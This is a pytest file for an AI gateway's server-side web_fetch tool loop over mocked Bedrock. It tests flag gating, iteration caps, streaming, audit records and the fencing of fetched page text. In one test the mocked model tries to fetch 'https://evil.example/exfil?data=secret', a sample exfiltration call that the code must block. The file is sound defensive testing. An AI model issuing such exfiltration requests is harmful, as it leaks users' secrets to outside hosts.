"""Converse-loop tests for the m2 web_fetch tool (mocked Bedrock).

The invariants under test (m2 plan / superseded web-fetch plan):

- flag off / client tools / no ctx → the request is byte-identical to the
  pre-m2 path (no toolConfig injection, tool_calls passthrough untouched);
- the model cannot smuggle a novel URL — only a valid index fetches;
- the loop is bounded: WEB_FETCH_MAX_ITERATIONS fetch rounds, one denied
  round, one forced text-only final;
- the stream path suppresses web_fetch toolUse deltas, forwards text,
  sums usage across rounds, and never surfaces tool_calls the client did
  not declare.
"""

import asyncio
import copy
import json

import pytest

from api import audit, budget, mint, setting, taint
from api.models import bedrock as bedrock_module
from api.models.bedrock import BedrockModel
from api.schema import ChatRequest
from api.tools import executor, web_fetch

MODEL = "anthropic.claude-3-sonnet-20240229-v1:0"

CTX = executor.ServerToolContext(
    identity="hmac-identity",
    binding=mint.BINDING_OWUI_SESSION,
    subject_id="user-1",
    chat_id="chat-1",
)


def chat_request(**overrides) -> ChatRequest:
    body = {
        "model": MODEL,
        "messages": [{"role": "user", "content": "Summarize https://a.example/1 please"}],
    }
    body.update(overrides)
    return ChatRequest(**body)


def tool_use_response(tool_input, text="Let me fetch that."):
    return {
        "output": {
            "message": {
                "role": "assistant",
                "content": [
                    {"text": text},
                    {
                        "toolUse": {
                            "toolUseId": "tu-1",
                            "name": "web_fetch",
                            "input": tool_input,
                        }
                    },
                ],
            }
        },
        "stopReason": "tool_use",
        "usage": {"inputTokens": 10, "outputTokens": 5},
    }


def final_response(text="Here is the summary."):
    return {
        "output": {"message": {"role": "assistant", "content": [{"text": text}]}},
        "stopReason": "end_turn",
        "usage": {"inputTokens": 20, "outputTokens": 7},
    }


class FakeBedrockRuntime:
    class exceptions:
        class ValidationException(Exception):
            pass

        class ThrottlingException(Exception):
            pass

    def __init__(self, responses=None, stream_rounds=None):
        self.calls: list[dict] = []
        self.responses = list(responses or [])
        self.stream_rounds = list(stream_rounds or [])

    def converse(self, **args):
        self.calls.append(copy.deepcopy(args))
        return self.responses.pop(0)

    def converse_stream(self, **args):
        self.calls.append(copy.deepcopy(args))
        return {"stream": iter(self.stream_rounds.pop(0))}


@pytest.fixture
def controls(monkeypatch):
    """Enable the flag and stub every store/transport the executor touches,
    recording audit records and fetched URLs."""
    state = {"records": [], "fetches": []}
    monkeypatch.setattr(setting, "ENABLE_WEB_FETCH_TOOL", True)
    monkeypatch.setattr(setting, "WEB_FETCH_ALLOWED_DOMAINS", "")
    monkeypatch.setattr(taint, "get_taint", lambda scope: None)
    monkeypatch.setattr(budget, "check_and_consume", lambda identity, scope: None)
    monkeypatch.setattr(taint, "record_tool_use", lambda scope, name: taint.OUTBOUND_FETCH)
    monkeypatch.setattr(
        mint,
        "get_connector_token",
        lambda identity, binding, subject_id: mint.MintedToken(
            token="jwt", expires_at=2**31, subject_id=subject_id
        ),
    )
    monkeypatch.setattr(
        audit, "emit_audit_record", lambda **kwargs: state["records"].append(kwargs)
    )

    def fetch(url, token):
        state["fetches"].append(url)
        return web_fetch.FetchResult(text="PAGE TEXT", url=url, bytes_returned=9, truncated=False)

    monkeypatch.setattr(web_fetch, "execute_web_fetch", fetch)
    return state


def install_runtime(monkeypatch, fake):
    monkeypatch.setattr(bedrock_module, "bedrock_runtime", fake)
    return fake


def run(coro):
    return asyncio.run(coro)


def collect_stream(gen) -> list[str]:
    async def _collect():
        return [chunk.decode() async for chunk in gen]

    return run(_collect())


# ------------------------------------------------------------- dark paths


def test_flag_off_is_the_exact_pre_m2_path(monkeypatch, controls):
    monkeypatch.setattr(setting, "ENABLE_WEB_FETCH_TOOL", False)
    fake = install_runtime(monkeypatch, FakeBedrockRuntime(responses=[final_response()]))
    response = run(BedrockModel().chat(chat_request(), CTX))
    assert len(fake.calls) == 1
    assert "toolConfig" not in fake.calls[0]
    assert response.choices[0].message.content == "Here is the summary."


def test_no_tool_ctx_is_the_exact_pre_m2_path(monkeypatch, controls):
    fake = install_runtime(monkeypatch, FakeBedrockRuntime(responses=[final_response()]))
    run(BedrockModel().chat(chat_request(), None))
    assert "toolConfig" not in fake.calls[0]


def test_client_tools_pass_through_untouched(monkeypatch, controls):
    """The loop invariant: any client tool present → response untouched."""
    fake = install_runtime(
        monkeypatch, FakeBedrockRuntime(responses=[tool_use_response({"q": "x"})])
    )
    request = chat_request(
        tools=[
            {
                "type": "function",
                "function": {"name": "web_fetch", "parameters": {"type": "object"}},
            }
        ]
    )
    response = run(BedrockModel().chat(request, CTX))
    # Exactly one Converse call, toolConfig is the CLIENT's (from
    # _parse_request), and the tool_calls surface to the caller unchanged —
    # even though the client's tool shares the web_fetch name (positional,
    # not nominal, separation).
    assert len(fake.calls) == 1
    client_tools = fake.calls[0]["toolConfig"]["tools"]
    assert client_tools[0]["toolSpec"]["name"] == "web_fetch"
    tool_calls = response.choices[0].message.tool_calls
    assert tool_calls[0].function.name == "web_fetch"
    assert controls["fetches"] == []


# ------------------------------------------------------------ happy loop


def test_fetch_loop_executes_and_returns_final_text(monkeypatch, controls):
    fake = install_runtime(
        monkeypatch,
        FakeBedrockRuntime(
            responses=[tool_use_response({"url_index": 0}), final_response()]
        ),
    )
    model = BedrockModel()
    response = run(model.chat(chat_request(), CTX))

    # First call injected exactly our spec.
    tool_config = fake.calls[0]["toolConfig"]
    assert tool_config["tools"][0]["toolSpec"]["name"] == "web_fetch"
    assert tool_config["toolChoice"] == {"auto": {}}

    # Continuation carries the assistant toolUse turn and a fenced toolResult.
    messages = fake.calls[1]["messages"]
    assert messages[-2]["role"] == "assistant"
    tool_result = messages[-1]["content"][0]["toolResult"]
    assert tool_result["toolUseId"] == "tu-1"
    assert tool_result["status"] == "success"
    fenced = tool_result["content"][0]["text"]
    assert "PAGE TEXT" in fenced and "TPAI-EXTERNAL-CONTENT" in fenced

    # Final response: plain text, summed usage, no tool_calls surfaced.
    assert response.choices[0].message.content == "Here is the summary."
    assert response.choices[0].message.tool_calls is None
    assert response.usage.prompt_tokens == 30
    assert response.usage.completion_tokens == 12
    assert controls["fetches"] == ["https://a.example/1"]
    assert controls["records"][0]["outcome"] == "success"
    assert model.server_tool_used == "web_fetch"


def test_prompt_cache_point_rides_continuations_when_enabled(monkeypatch, controls):
    monkeypatch.setattr(setting, "WEB_FETCH_PROMPT_CACHE", True)
    fake = install_runtime(
        monkeypatch,
        FakeBedrockRuntime(
            responses=[tool_use_response({"url_index": 0}), final_response()]
        ),
    )
    run(BedrockModel().chat(chat_request(), CTX))
    assert fake.calls[1]["messages"][-1]["content"][-1] == {"cachePoint": {"type": "default"}}


def test_cache_points_are_pruned_to_the_claude_ceiling(monkeypatch, controls):
    """5 continuation rounds would carry 5 cachePoints — one over Claude's
    4-checkpoint Converse limit; the oldest must be pruned."""
    monkeypatch.setattr(setting, "WEB_FETCH_PROMPT_CACHE", True)
    fake = install_runtime(
        monkeypatch,
        FakeBedrockRuntime(
            responses=[tool_use_response({"url_index": 0}) for _ in range(5)] + [final_response()]
        ),
    )
    run(BedrockModel().chat(chat_request(), CTX))
    # 4 fetch rounds + 1 denied round appended -> the 6th Converse call.
    final_messages = fake.calls[5]["messages"]
    cache_points = sum(
        1
        for message in final_messages
        if isinstance(message.get("content"), list)
        for block in message["content"]
        if isinstance(block, dict) and "cachePoint" in block
    )
    assert cache_points == 4
    # The newest round keeps its marker.
    assert final_messages[-1]["content"][-1] == {"cachePoint": {"type": "default"}}


# -------------------------------------------------------------- smuggling


def test_model_cannot_smuggle_a_novel_url(monkeypatch, controls):
    """A free URL string in the tool input never fetches (D3)."""
    fake = install_runtime(
        monkeypatch,
        FakeBedrockRuntime(
            responses=[
                tool_use_response({"url": "https://evil.example/exfil?data=secret"}),
                final_response("Understood."),
            ]
        ),
    )
    response = run(BedrockModel().chat(chat_request(), CTX))
    assert controls["fetches"] == []
    assert controls["records"][0]["policy_reason"] == "invalid-url-index"
    tool_result = fake.calls[1]["messages"][-1]["content"][0]["toolResult"]
    assert tool_result["status"] == "error"
    assert "evil.example" not in tool_result["content"][0]["text"]
    assert response.choices[0].message.content == "Understood."


def test_out_of_range_index_never_fetches(monkeypatch, controls):
    install_runtime(
        monkeypatch,
        FakeBedrockRuntime(
            responses=[tool_use_response({"url_index": 7}), final_response()]
        ),
    )
    run(BedrockModel().chat(chat_request(), CTX))
    assert controls["fetches"] == []
    assert controls["records"][0]["policy_reason"] == "invalid-url-index"


# ---------------------------------------------------------- loop bounding


def test_iteration_cap_bounds_the_loop(monkeypatch, controls):
    monkeypatch.setattr(setting, "WEB_FETCH_MAX_ITERATIONS", 1)
    fake = install_runtime(
        monkeypatch,
        FakeBedrockRuntime(
            responses=[
                tool_use_response({"url_index": 0}),
                tool_use_response({"url_index": 0}),
                tool_use_response({"url_index": 0}, text="Still trying."),
            ]
        ),
    )
    response = run(BedrockModel().chat(chat_request(), CTX))
    # 1 fetch round + 1 denied round + 1 forced final = 3 Converse calls.
    assert len(fake.calls) == 3
    assert controls["fetches"] == ["https://a.example/1"]
    # The attempt made AFTER the denied round is audited too — the WORM
    # trail records attempts, not just executions.
    reasons = [r["policy_reason"] for r in controls["records"]]
    assert reasons == ["beta-allow-all", "iteration-cap", "iteration-cap"]
    # The forced final is text-only — no tool_calls surfaced to a client
    # that declared no tools.
    assert response.choices[0].message.tool_calls is None
    assert response.choices[0].message.content == "Still trying."


def test_executor_crash_fails_closed_as_toolresult_error(monkeypatch, controls):
    def explode(plan, ctx, name, tool_input):
        raise RuntimeError("bug")

    monkeypatch.setattr(executor, "run_server_tool", explode)
    fake = install_runtime(
        monkeypatch,
        FakeBedrockRuntime(
            responses=[tool_use_response({"url_index": 0}), final_response()]
        ),
    )
    response = run(BedrockModel().chat(chat_request(), CTX))
    tool_result = fake.calls[1]["messages"][-1]["content"][0]["toolResult"]
    assert tool_result["status"] == "error"
    assert response.choices[0].message.content == "Here is the summary."
    # Even the crashed call leaves a best-effort audit record.
    assert [r["policy_reason"] for r in controls["records"]] == ["executor-error"]


def test_stream_planning_error_surfaces_as_in_band_sse_error(monkeypatch, controls):
    """A planning failure after the 200 headers are sent must become the
    documented in-band SSE error event, not a severed connection."""

    def boom(chat_request_arg, ctx):
        raise RuntimeError("planning bug")

    monkeypatch.setattr(executor, "plan_server_tools", boom)
    install_runtime(monkeypatch, FakeBedrockRuntime())
    model = BedrockModel()
    chunks = collect_stream(model.chat_stream(chat_request(stream=True), CTX))
    assert model.stream_error is True
    assert any('"error"' in c for c in chunks)


# ----------------------------------------------------------------- stream


def stream_tool_round(input_fragments=('{"url_ind', 'ex": 0}')):
    chunks = [
        {"messageStart": {"role": "assistant"}},
        {"contentBlockDelta": {"contentBlockIndex": 0, "delta": {"text": "Checking. "}}},
        {
            "contentBlockStart": {
                "contentBlockIndex": 1,
                "start": {"toolUse": {"toolUseId": "tu-1", "name": "web_fetch"}},
            }
        },
    ]
    chunks += [
        {"contentBlockDelta": {"contentBlockIndex": 1, "delta": {"toolUse": {"input": frag}}}}
        for frag in input_fragments
    ]
    chunks += [
        {"messageStop": {"stopReason": "tool_use"}},
        {"metadata": {"usage": {"inputTokens": 10, "outputTokens": 5, "totalTokens": 15}}},
    ]
    return chunks


def stream_final_round(text="Answer."):
    return [
        {"messageStart": {"role": "assistant"}},
        {"contentBlockDelta": {"contentBlockIndex": 0, "delta": {"text": text}}},
        {"messageStop": {"stopReason": "end_turn"}},
        {"metadata": {"usage": {"inputTokens": 20, "outputTokens": 7, "totalTokens": 27}}},
    ]


def test_stream_loop_suppresses_tool_deltas_and_sums_usage(monkeypatch, controls):
    fake = install_runtime(
        monkeypatch,
        FakeBedrockRuntime(stream_rounds=[stream_tool_round(), stream_final_round()]),
    )
    model = BedrockModel()
    request = chat_request(stream=True, stream_options={"include_usage": True})
    chunks = collect_stream(model.chat_stream(request, CTX))
    joined = "".join(chunks)

    # Text forwarded, tool machinery invisible to the client.
    assert "Checking. " in joined
    assert "Answer." in joined
    assert "tool_calls" not in joined
    assert "web_fetch" not in joined
    assert "url_index" not in joined
    # Exactly one role chunk despite two Bedrock rounds.
    assert joined.count('"role":"assistant"') == 1
    # The fetch executed with the buffered, fragment-assembled input.
    assert controls["fetches"] == ["https://a.example/1"]
    # Continuation round carried the fenced toolResult.
    tool_result = fake.calls[1]["messages"][-1]["content"][0]["toolResult"]
    assert "PAGE TEXT" in tool_result["content"][0]["text"]
    # Usage summed across rounds into one final chunk + access-log contract.
    usage_chunks = [json.loads(c[6:]) for c in chunks if '"usage"' in c and "[DONE]" not in c]
    assert usage_chunks[-1]["usage"]["prompt_tokens"] == 30
    assert usage_chunks[-1]["usage"]["completion_tokens"] == 12
    assert model.stream_usage.total_tokens == 42
    assert chunks[-1] == "data: [DONE]\n\n"
    assert model.server_tool_used == "web_fetch"


def test_stream_status_line_shows_host_only(monkeypatch, controls):
    monkeypatch.setattr(setting, "WEB_FETCH_STREAM_STATUS", True)
    install_runtime(
        monkeypatch,
        FakeBedrockRuntime(stream_rounds=[stream_tool_round(), stream_final_round()]),
    )
    request = chat_request(stream=True)
    joined = "".join(collect_stream(BedrockModel().chat_stream(request, CTX)))
    assert "Fetching a.example" in joined
    # Host only — the path stays out of the stream.
    assert "/1" not in joined.replace("a.example/1", "")


def test_stream_malformed_tool_input_denies_without_fetch(monkeypatch, controls):
    install_runtime(
        monkeypatch,
        FakeBedrockRuntime(
            stream_rounds=[stream_tool_round(input_fragments=('{"url_index": ',)), stream_final_round()]
        ),
    )
    request = chat_request(stream=True)
    joined = "".join(collect_stream(BedrockModel().chat_stream(request, CTX)))
    assert controls["fetches"] == []
    assert controls["records"][0]["policy_reason"] == "invalid-url-index"
    assert "Answer." in joined


def test_stream_client_tools_pass_through_untouched(monkeypatch, controls):
    """Regression: with client tools the pre-m2 stream path surfaces
    tool_call deltas exactly as before."""
    fake = install_runtime(
        monkeypatch,
        FakeBedrockRuntime(
            stream_rounds=[
                [
                    {"messageStart": {"role": "assistant"}},
                    {
                        "contentBlockStart": {
                            "contentBlockIndex": 1,
                            "start": {"toolUse": {"toolUseId": "tu-9", "name": "client_tool"}},
                        }
                    },
                    {
                        "contentBlockDelta": {
                            "contentBlockIndex": 1,
                            "delta": {"toolUse": {"input": '{"a": 1}'}},
                        }
                    },
                    {"messageStop": {"stopReason": "tool_use"}},
                ]
            ]
        ),
    )
    request = chat_request(
        stream=True,
        tools=[
            {
                "type": "function",
                "function": {"name": "client_tool", "parameters": {"type": "object"}},
            }
        ],
    )
    joined = "".join(collect_stream(BedrockModel().chat_stream(request, CTX)))
    assert "client_tool" in joined
    assert "tool_calls" in joined
    assert len(fake.calls) == 1
    assert controls["fetches"] == []


def test_stream_iteration_cap_ends_cleanly(monkeypatch, controls):
    monkeypatch.setattr(setting, "WEB_FETCH_MAX_ITERATIONS", 1)
    install_runtime(
        monkeypatch,
        FakeBedrockRuntime(
            stream_rounds=[stream_tool_round(), stream_tool_round(), stream_tool_round()]
        ),
    )
    request = chat_request(stream=True)
    chunks = collect_stream(BedrockModel().chat_stream(request, CTX))
    joined = "".join(chunks)
    assert controls["fetches"] == ["https://a.example/1"]
    assert [r["policy_reason"] for r in controls["records"]] == [
        "beta-allow-all",
        "iteration-cap",
        "iteration-cap",
    ]
    assert "tool_calls" not in joined
    assert chunks[-1] == "data: [DONE]\n\n"


# ------------------------------------------------------------ router plumbing


def test_router_passes_tool_ctx_and_logs_tool_name(client, monkeypatch):
    from tests.conftest import AUTH, CHAT_BODY, StubBedrockModel, expected_hmac

    StubBedrockModel.last_tool_ctx = None
    headers = {**AUTH, "X-OpenWebUI-User-Id": "user-42", "X-OpenWebUI-Chat-Id": "chat-42"}
    resp = client.post("/api/v1/chat/completions", json=CHAT_BODY, headers=headers)
    assert resp.status_code == 200
    ctx = StubBedrockModel.last_tool_ctx
    assert ctx is not None
    assert ctx.identity == expected_hmac("owui-user-id", "user-42")
    assert ctx.binding == mint.BINDING_OWUI_SESSION
    assert ctx.subject_id == "user-42"
    assert ctx.chat_id == "chat-42"
